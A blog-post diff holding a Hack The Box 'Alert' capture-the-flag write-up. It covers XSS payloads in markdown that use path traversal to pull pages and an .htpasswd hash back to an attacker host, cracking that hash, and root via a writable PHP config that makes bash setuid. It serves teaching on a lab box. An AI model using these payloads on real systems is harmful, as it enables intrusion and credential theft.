@@ -1,0 +1,327 @@
+---
+title: "HTB: Alert"
+date: 2024-12-02
+description: "Alert is a box that consist of exploiting cross-site scripting and file permission to fully take over the machine."
+keywords: ["HTB", "HackTheBox", "Alert", "Alert.HTB"]
+draft: false
+---
+
+## Initial Foothold
+
+
+As always let's start running a nmap scan to search for services and open ports.
+
+```bash title="Nmap Result"
+~/HTB/Alert ❯ nmap --min-rate 100000 -sV -sC 10.129.199.31 -o nmap.result
+Starting Nmap 7.95 ( https://nmap.org ) at 2024-12-01 12:05 CET
+Nmap scan report for alert.htb (10.129.199.31)
+Host is up (0.11s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
+|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
+|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-title: Alert - Markdown Viewer
+|_Requested resource was index.php?page=alert
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.38 seconds
+```
+
+The ports 22 and 80 indicates that the machine requires us to exploit the web application for the initial foothold. Let's add `alert.htb` to our `/etc/hosts` file to access the web application.
+
+```text title="/etc/hosts"
+##
+# Host Database
+#
+# localhost is used to configure the loopback interface
+# when the system is booting.  Do not change this entry.
+##
+127.0.0.1	localhost
+255.255.255.255	broadcasthost
+::1             localhost
+10.129.199.31	alert.htb
+```
+
+The web application allows us to upload markdown files and share it with other users. It also has an contact us page where we can interact with the logged in user.
+
+**Markdown Page:**
+
+<img src="/assets/images/htb-alert/htb-alert-1.png" />
+
+**Contact Us Page:**
+
+<img src="/assets/images/htb-alert/htb-alert-2.png" />
+
+After researching the markdown file upload functionality I found out that the web application executes the JavaScript code that is added into the markdown file. I created the following script which fetches `index.php` of the user that visits the page.
+
+```markdown title="Malicious Markdown File: Retrieves alert page"
+# Introduction
+
+<script>
+fetch("http://alert.htb/index.php?page=alert").then(response => response.text()).then(data => fetch("http://10.10.16.9/steal.php?content=" + btoa(data)));
+</script>
+
+# Main
+
+Test #2
+
+# Conclusion
+
+Test #3
+```
+
+<img src="/assets/images/htb-alert/htb-alert-3.png" className="rounded-lg"/>
+
+After uploading the markdown file, I was able to obtain the URL of the markdown file. I sent that URL to the logged-on user through the contact us page.
+
+<img src="/assets/images/htb-alert/htb-alert-4.png" />
+
+
+```bash title="Kali Linux: Netcat Listener"
+~/HTB/Alert ❯ nc -l 80
+GET /steal.php?content=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWFya2Rvd24gVmlld2VyPC9oMT48ZGl2IGNsYXNzPSJmb3JtLWNvbnRhaW5lciI+CiAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0idmlzdWFsaXplci5waHAiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgYWNjZXB0PSIubWQiIHJlcXVpcmVkPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlZpZXcgTWFya2Rvd24iPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICA8L2Rpdj4gICAgPC9kaXY+CiAgICA8Zm9vdGVyPgogICAgICAgIDxwIHN0eWxlPSJjb2xvcjogYmxhY2s7Ij6pIDIwMjQgQWxlcnQuIEFsbCByaWdodHMgcmVzZXJ2ZWQuPC9wPgogICAgPC9mb290ZXI+CjwvYm9keT4KPC9odG1sPgoK HTTP/1.1
+Host: 10.10.16.9
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
+Accept: */*
+Origin: http://alert.htb
+Referer: http://alert.htb/
+Accept-Encoding: gzip, deflate
+```
+
+I successfully manged to retrieve the `index.php` page from the logged-on user and to see the HTML code we need to decode it using Base64 decoder.
+
+```html
+~/HTB/Alert ❯ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWFya2Rvd24gVmlld2VyPC9oMT48ZGl2IGNsYXNzPSJmb3JtLWNvbnRhaW5lciI+CiAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0idmlzdWFsaXplci5waHAiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgYWNjZXB0PSIubWQiIHJlcXVpcmVkPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlZpZXcgTWFya2Rvd24iPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICA8L2Rpdj4gICAgPC9kaXY+CiAgICA8Zm9vdGVyPgogICAgICAgIDxwIHN0eWxlPSJjb2xvcjogYmxhY2s7Ij6pIDIwMjQgQWxlcnQuIEFsbCByaWdodHMgcmVzZXJ2ZWQuPC9wPgogICAgPC9mb290ZXI+CjwvYm9keT4KPC9odG1sPgoK" | base64 -d
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <title>Alert - Markdown Viewer</title>
+</head>
+<body>
+    <nav>
+        <a href="index.php?page=alert">Markdown Viewer</a>
+        <a href="index.php?page=contact">Contact Us</a>
+        <a href="index.php?page=about">About Us</a>
+        <a href="index.php?page=donate">Donate</a>
+        <a href="index.php?page=messages">Messages</a>    </nav>
+    <div class="container">
+        <h1>Markdown Viewer</h1><div class="form-container">
+            <form action="visualizer.php" method="post" enctype="multipart/form-data">
+                <input type="file" name="file" accept=".md" required>
+                <input type="submit" value="View Markdown">
+            </form>
+          </div>    </div>
+    <footer>
+        <p style="color: black;">� 2024 Alert. All rights reserved.</p>
+    </footer>
+</body>
+</html>
+```
+
+I spent a bit time fetching all the sites that the logged-on has access to and spotted that the `file` param-eter inside `message.php` file is vulnerable for path traversal. To exploit the path traversal vulnerability I created the following payload and sent the URL of the payload to the logged-on user.
+
+```markdown title="Malicious Markdown File: Retrieves /etc/apache2/sites-available/000-default.conf"
+# Introduction
+
+<script>
+fetch("http://alert.htb/messages.php?file=../../../../etc/apache2/sites-available/000-default.conf").then(response => response.text()).then(data => fetch("http://10.10.16.9/steal.php?content=" + btoa(data)));
+</script>
+
+# Main
+
+Test #2
+
+# Conclusion
+
+Test #3
+```
+
+```bash title="Kali Linux: Netcat Listener"
+~/HTB/Alert ❯ nc -l 80                                                                                                  7s
+GET /steal.php?content=PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICBEb2N1bWVudFJvb3QgL3Zhci93d3cvc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVycmlkZSBBbGwKICAgICAgICBBdXRoVHlwZSBCYXNpYwogICAgICAgIEF1dGhOYW1lICJSZXN0cmljdGVkIEFyZWEiCiAgICAgICAgQXV0aFVzZXJGaWxlIC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiLy5odHBhc3N3ZAogICAgICAgIFJlcXVpcmUgdmFsaWQtdXNlcgogICAgPC9EaXJlY3Rvcnk+CgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0PgoKPC9wcmU+Cg== HTTP/1.1
+Host: 10.10.16.9
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
+Accept: */*
+Origin: http://alert.htb
+Referer: http://alert.htb/
+Accept-Encoding: gzip, deflate
+```
+
+Again we can decode the content by using Base64 decoder but I prefer decoding the content using the Linux terminal as it's quicker and more efficient.
+
+```xml title="/etc/apache2/sites-available/000-default.conf"
+~/HTB/Alert ❯ echo "PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICBEb2N1bWVudFJvb3QgL3Zhci93d3cvc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVycmlkZSBBbGwKICAgICAgICBBdXRoVHlwZSBCYXNpYwogICAgICAgIEF1dGhOYW1lICJSZXN0cmljdGVkIEFyZWEiCiAgICAgICAgQXV0aFVzZXJGaWxlIC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiLy5odHBhc3N3ZAogICAgICAgIFJlcXVpcmUgdmFsaWQtdXNlcgogICAgPC9EaXJlY3Rvcnk+CgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0PgoKPC9wcmU+Cg==" | base64 -d
+<pre><VirtualHost *:80>
+    ServerName alert.htb
+
+    DocumentRoot /var/www/alert.htb
+
+    <Directory /var/www/alert.htb>
+        Options FollowSymLinks MultiViews
+        AllowOverride All
+    </Directory>
+
+    RewriteEngine On
+    RewriteCond %{HTTP_HOST} !^alert\.htb$
+    RewriteCond %{HTTP_HOST} !^$
+    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+<VirtualHost *:80>
+    ServerName statistics.alert.htb
+
+    DocumentRoot /var/www/statistics.alert.htb
+
+    <Directory /var/www/statistics.alert.htb>
+        Options FollowSymLinks MultiViews
+        AllowOverride All
+    </Directory>
+
+    <Directory /var/www/statistics.alert.htb>
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        AuthType Basic
+        AuthName "Restricted Area"
+        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
+        Require valid-user
+    </Directory>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+</pre>
+```
+
+What is interesting about the `000-default.conf` file? Usually, it contains useful information about the web application and sometimes credentials inside `.htpasswd` file. Let's modify our JavaScript code to read the `.htpasswd` file from `statistics.alert.htb` folder.
+
+```markdown title="Malicious Markdown File: Retrieves /var/www/sratistics.alert.htb/.htpasswd"
+# Introduction
+
+<script>
+fetch("http://alert.htb/messages.php?file=../../../../var/www/statistics.alert.htb/.htpasswd").then(response => response.text()).then(data => fetch("http://10.10.16.9/steal.php?content=" + btoa(data)));
+</script>
+
+# Main
+
+Test #2
+
+# Conclusion
+
+Test #3
+```
+
+```bash title="Kali Linux: Netcat Listener"
+~/HTB/Alert ❯ nc -l 80
+GET /steal.php?content=PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K HTTP/1.1
+Host: 10.10.16.9
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
+Accept: */*
+Origin: http://alert.htb
+Referer: http://alert.htb/
+Accept-Encoding: gzip, deflate
+
+~/HTB/Alert ❯ echo "PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K" | base64 -d          12s
+<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre>
+```
+
+I managed to obtain the password hash of an user, and now let's try to crack the password using hashcat. 
+
+```text
+~/HTB/Alert ❯ hashcat -m 1600 -a 0 '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' rockyou.txt
+...
+$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
+...
+```
+
+Hashcat successfully cracked the password and now we can try to login as Albert using the SSH protocol and read the `user.txt` file.
+
+```
+~/HTB/Alert ❯ ssh albert@alert.HTB
+...
+albert@alert:~$ whoami
+albert
+albert@alert:~$ hostname
+alert
+albert@alert:~$ pwd
+/home/albert
+albert@alert:~$ cat /home/albert/user.txt
+7d9099094f9d0a8ce2764a66d612a7dc
+...
+```
+
+## Privilege Escalation
+
+Inside `/opt/website-monitor` the `index.php` file is executed as root.
+
+```bash title="/opt/website-monitor"
+albert@alert:/opt/website-monitor$ ls -la
+total 96
+drwxrwxr-x 7 root root        4096 Oct 12 01:07 .
+drwxr-xr-x 4 root root        4096 Oct 12 00:58 ..
+drwxrwxr-x 2 root management  4096 Oct 12 04:17 config
+drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git
+drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
+-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
+-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
+-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
+drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
+-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
+-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
+-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
+-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
+drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates
+```
+
+```php title="/opt/website-monitor/index.php"
+<?php
+
+include('config/configuration.php');
+include(PATH.'/Parsedown.php');
+
+?>
+```
+
+The `index.pgp` file imports `configuration.php` file from the config folder which we have read, write, and execute privileges on. And that means we can replace the `configuration.php` file with our malicious payload and it will be executed by root.
+
+```bash title="Replacing /opt/website-monitor/config/configuration.php"
+albert@alert:/opt/website-monitor/config$ echo "<?php shell_exec('sudo chmod -R 7777 /bin/bash') ?>" > configuration.php
+```
+
+After replacing the `configuration.php` file inside `/opt/website-monitor/config` I was successfully able to obtain a root shell and read the `root.txt` flag.
+
+```bash
+albert@alert:/opt/website-monitor/config$ ls -la /bin/bash
+-rwsrwsrwt 1 root root 1183448 Apr 18  2022 /bin/bash
+albert@alert:/opt/website-monitor/config$ /bin/bash -p
+bash-5.0# whoami
+root
+bash-5.0# hostname
+alert
+bash-5.0# pwd
+/opt/website-monitor/config
+bash-5.0# cat /root/root.txt
+0027b072067eaa5e31794e08a2f8c1c5
+bash-5.0#
+```
+
+## Conclusion
+
+The Alert machine was a interesting machine as it required me to use the knowledge I had about Cross Site Scripting (XSS) in a different way. Instead of obtaining user cookie through `document.cookie` and use that to login. It required me to fetch all the different pages the logged-on user had access to and find a vulner-ability that is exploitable. 
+
+The privilege escalation of the machine was also interesting as it taught me to pay attention to folder permission. I would highly recommend doing this machine if you're interested in learning more about Cross Site Scripting (XSS).
